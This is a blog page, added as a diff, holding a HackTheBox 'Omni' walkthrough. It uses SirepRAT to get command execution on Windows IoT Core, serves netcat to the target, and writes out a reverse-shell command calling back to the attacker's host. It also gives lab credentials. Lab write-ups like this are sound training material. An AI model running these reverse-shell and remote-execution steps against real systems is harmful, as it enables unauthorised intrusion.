@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="Let us discuss about security">
+    <meta name="author" content="3kara &lt;adm1n.3kara@protonmail.com&gt;">
+    <meta name="twitter:card" content="summary" /> <!--Page Cover-->
+    
+    <title>HackTheBox Omni - 3kara</title> 
+    
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+    <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" rel="stylesheet" type="text/css">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.13.1/css/all.css" integrity="sha384-xxzQGERXS00kBmZW/6qxqJPyxW3UR0BPsL4c8ILaIWXva5kFi7TxkIIaMiKtqV1Q" crossorigin="anonymous">
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+    <link rel="stylesheet" href="/css/style.css">
+
+</head>
+
+<body>
+    <a href="javascript:" id="rtt"><i class="fas fa-chevron-up"></i></a>
+    <div class="bg-gradient"></div>
+    <div class="bg-pattern"></div>
+    
+    <!--Menu Links and Overlay-->
+    <div class="menu-bg">
+        <div class="menu-container">
+            <ul>
+                <li class="menu-item"><a href="/">Home</a></li>
+                <li class="menu-item"><a href="/api">API</a></li>
+                <li class="menu-item"><a href="/blog">Blog</a></li>
+                <li class="menu-item"><a href="/ics">ICS</a></li>
+                <li class="menu-item"><a href="/oscp">Oscp</a></li>
+                <li class="menu-item"><a href="/search">Search <i class="fas fa-search"></i></a>
+            </ul>
+        </div>
+    </div>
+    
+    <!--Hamburger Icon-->
+    <nav>
+        <a href="#menu"></a>
+    </nav>
+    
+    <div class="container">
+    
+        <!-- Main Content -->
+        <div class="row">
+        <div class="col-sm-12">
+    
+        <!--Title and Logo-->
+        <header>
+        <div class="logo">
+            <a href="/"><i class="logo-icon rotate linear infinite fas fa-dharmachakra" aria-hidden="true"></i></a>
+            <h1 id="main-title" class="title">HackTheBox</h1>
+        </div>
+        </header>
+    
+    <section class="main">
+                
+                     
+    <div class="post">
+    
+        <div class="post-header">
+            <h1 class="title"><a href="/writeups/htb/omni">HackTheBox - Omni</a></h1>
+        </div>
+    
+        <div class="content">
+
+            <div><img src="/writeups/htb/img/omni/boxinfo.png" class="img-thumbnail" /></div><br>
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2>
+            <p>omni is based on the Windows OS for IOT having an IP 10.10.10.204 and was released on 22 Aug 2020 which falls under the category of Easy Difficulty giving 20 points for submitting both the flags. Connect to the HTB Network using the provided openvpn configuration and verify that you are connected to the network <a href="https://www.hackthebox.eu/home/htb/access">here</a></p>
+            <h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2>
+            <p>Let us start by doing NMAP on this IP as shown below.</p>
+            <div class="picture-container"><a href="nmap" data-featherlight="/writeups/htb/img/omni/o-nmap.png"><img src="/writeups/htb/img/omni/o-nmap.png" class="img-thumbnail" /></a></div><br>
+            <p>We can see various ports open, if we go to the 8080 with the browser, we come across a login request that we do not have.</p>
+            <div class="picture-container"><a href="http" data-featherlight="/writeups/htb/img/omni/o-port8080.png"><img src="/writeups/htb/img/omni/o-port8080.png" class="img-thumbnail" /></a></div><br>
+            <p>As we can see that the prompt mentions it as a "windows device portal". we can guess that we are on a IOT box. we could take help of SafeBreach-Lab's <b>SirepRAT</b></p>
+            <p>SirepRAT has a functionality which lets us run Arbitrary Program. Remote Command Execution as SYSTEM on Windows IOT Core.</p>
+            <p>Let's First download the SirepRAT using git clone as shown below and Second Download Windows Netcat Binary(64 bit) from <a href="https://eternallybored.org/misc/netcat/">here.</a> for taking the reverse shell from the system.</p>
+            <blockquote>git clone https://github.com/SafeBreach-Labs/SirepRAT.git</blockquote>
+            <p>unzip the netcat and launch simple python server from the same directory as shown</p>
+            <div class="picture-container"><a href="httpserver" data-featherlight="/writeups/htb/img/omni/o-httpserver.png"><img src="/writeups/htb/img/omni/o-httpserver.png" class="img-thumbnail" /></a></div><br>
+            <p>Now let us go to SirepRAT directory and run it as shown below.</p>
+            <div class="picture-container"><a href="sireprat" data-featherlight="/writeups/htb/img/omni/o-sireprat.png"><img src="/writeups/htb/img/omni/o-sireprat.png" class="img-thumbnail" /></a></div><br>
+            <p>Lets look at SimpleHTTPServer, and it looks like the box made a Web-Request and we have uploaded our file successfully.</p>
+            <div class="picture-container"><a href="httpserverrequest" data-featherlight="/writeups/htb/img/omni/o-httpserverrequest.png"><img src="/writeups/htb/img/omni/o-httpserverrequest.png" class="img-thumbnail" /></a></div><br>
+            <p>Now let us start our listener and get the reverse connection.</p>
+            <div class="picture-container"><a href="nc" data-featherlight="/writeups/htb/img/omni/o-nc.png"><img src="/writeups/htb/img/omni/o-nc.png" class="img-thumbnail" /></a></div><br>
+            <div class="picture-container"><a href="sirepratreverse" data-featherlight="/writeups/htb/img/omni/o-sirepratreverse.png"><img src="/writeups/htb/img/omni/o-sirepratreverse.png" class="img-thumbnail" /></a></div><br>
+            <div class="picture-container"><a href="ncreverse" data-featherlight="/writeups/htb/img/omni/o-ncreverse.png"><img src="/writeups/htb/img/omni/o-ncreverse.png" class="img-thumbnail" /></a></div><br>
+            <p>we can't use whoami, but we can use <b>$env:UserName</b> to know the username.</p>
+            <div class="picture-container"><a href="omniuser" data-featherlight="/writeups/htb/img/omni/o-omniuser.png"><img src="/writeups/htb/img/omni/o-omniuser.png" class="img-thumbnail" /></a></div><br>
+            <p>We are user Omni and has no permissions to read in user.txt or root.txt. After further Enumeration we got a bat file in a directory having credentials of two users.</p>
+            <div class="picture-container"><a href="directory" data-featherlight="/writeups/htb/img/omni/o-directory.png"><img src="/writeups/htb/img/omni/o-directory.png" class="img-thumbnail" /></a></div><br>
+            <p>We will try to use these credentials in the webpage we got earlier. Jump to browser and login using <b>app:mesh5143</b> then go to <b>Processes > Run Command.</b><br>Let us try to get the reverse shell by the following command, start nc on different port as shown.</p>
+            <blockquote>C:\Windows\System32\spool\drivers\color\nc64.exe 10.10.10.211 3333 -e powershell.exe</blockquote>
+            <div class="picture-container"><a href="usershell" data-featherlight="/writeups/htb/img/omni/o-usershell.png"><img src="/writeups/htb/img/omni/o-usershell.png" class="img-thumbnail" /></a></div><br>
+            <p>we are in the app user but the contents inside this file is encrypted, so lets use this windows function</p>
+            <div class="picture-container"><a href="userflag" data-featherlight="/writeups/htb/img/omni/o-userflag.png"><img src="/writeups/htb/img/omni/o-userflag.png" class="img-thumbnail" /></a></div><br>
+            <p>we got the user flag, now let us use the other credential to get the root flag. login using <b>administrator:_1nt3rn37ofTh1nGz</b> and goto <b>Processes > Run Command</b> then star the nc.</p>
+            <div class="picture-container"><a href="rootshell" data-featherlight="/writeups/htb/img/omni/o-rootshell.png"><img src="/writeups/htb/img/omni/o-rootshell.png" class="img-thumbnail" /></a></div><br>
+            <p>Now let us get the admin flag using the same commands as used for user.</p>
+            <div class="picture-container"><a href="rootflag" data-featherlight="/writeups/htb/img/omni/o-rootflag.png"><img src="/writeups/htb/img/omni/o-rootflag.png" class="img-thumbnail" /></a></div><br>
+                        
+        </div>
+    </div>
+                   
+    </section>
+    </div>
+    </div>
+
+    
+
+    </div>
+    
+    <!-- Footer -->
+    <div class="push"></div>
+    
+    <footer class="footer-content">
+        <div class="container">
+            <div class="row">
+                <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                    <h2><a href="#">About</a></h2>
+                    <p>3kara is the source for security concepts and information about Web, Mobile and API along with few Walkthroughs, Best practices, Cheatsheets, Custom Scripts, Tips & Techniques.</p>
+                    <p>Our goal is to spread enthusiasm, awareness and joy on information security as well as to document and share what we were able to learn  along the way.</p>
+                </div>
+                
+                <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-contact">
+                    <h2>Contact</h2>
+                    <p>For queries, Contact us at adm1n.3kara@protonmail.com</p>
+                    <p>Stuck somewhere? Don't hesitate</p> 
+                    <p>Contact author directly by clicking on their name.</p>
+                </div>
+                
+    </div>
+            <div class="row">
+                <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                    <ul class="list-inline footer-social-icons">
+                        
+                        <li class="list-inline-item"><a href="https://3kara.github.com"><span class="footer-icon-container"><i class="fab fa-github"></i></span></a></li>
+                        <li class="list-inline-item"><a href="https://twitter.com/_3kara?lang=en"><span class="footer-icon-container"><i class="fab fa-twitter"></i></span></a></li>
+                        <li class="list-inline-item"><a href="https://t.me/i3kara"><span class="footer-icon-container"><i class="fab fa-telegram"></i></span></a></li>
+                        <li class="list-inline-item"><a href="mailto:adm1n.3kara@protonmail.com"><span class="footer-icon-container"><i class="far fa-envelope"></i></span></a></li>
+                        <li class="list-inline-item"><a href="https://discord.gg/4uuuqHp"><span class="footer-icon-container"><i class="fab fa-discord"></i></span></a></li>
+                                                                       
+                    </ul>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                    <div class="footer-copyright">
+                        All rights reserved &copy; 3kara <script>document.write(new Date().getFullYear());</script> You reap what you sow
+
+                    </div>
+                </div>
+            </div>
+        </div>
+       
+    </footer>
+     
+    <!-- After footer scripts -->
+    
+    <script src="//code.jquery.com/jquery-2.1.4.min.js"></script> <!-- jQuery -->    
+    <script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script> <!-- Tween Max --> 
+    <script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script> <!-- Gallery -->
+    <script src="/js/main.js"></script>
+    
+    </body>
+    
+    </html>
